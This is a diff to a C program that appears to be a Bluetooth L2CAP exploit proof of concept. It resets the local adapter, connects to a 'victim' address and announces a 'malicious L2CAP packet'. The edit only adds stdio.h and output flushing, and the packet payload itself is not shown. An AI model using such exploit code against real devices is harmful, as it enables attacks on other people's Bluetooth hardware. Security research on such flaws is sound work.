@@ -2,6 +2,7 @@
 #include <unistd.h>
 #include <sys/socket.h>
 #include <sys/uio.h>
+#include <stdio.h>
 #include <bluetooth/bluetooth.h>
 #include <bluetooth/l2cap.h>
 #include <bluetooth/hci.h>
@@ -87,10 +88,12 @@ int main(int argc, char **argv) {
   str2ba(argv[1], &dst_addr);
 
   printf("[*] Resetting hci0 device...\n");
+  fflush(stdout);
   system("sudo hciconfig hci0 down");
   system("sudo hciconfig hci0 up");
 
   printf("[*] Opening hci device...\n");
+  fflush(stdout);
   struct hci_dev_info di;
   int hci_device_id = hci_get_route(NULL);
   int hci_socket = hci_open_dev(hci_device_id);
@@ -115,6 +118,7 @@ int main(int argc, char **argv) {
   }
 
   printf("[*] Connecting to victim...\n");
+  fflush(stdout);
 
   struct sockaddr_l2 laddr = {0};
   laddr.l2_family = AF_BLUETOOTH;
@@ -150,8 +154,10 @@ int main(int argc, char **argv) {
 
   uint16_t hci_handle = l2_conninfo.hci_handle;
   printf("[+] HCI handle: %x\n", hci_handle);
+  fflush(stdout);
 
   printf("[*] Sending malicious L2CAP packet...\n");
+  fflush(stdout);
   struct {
     l2cap_hdr hdr;
     uint16_t ctrl;
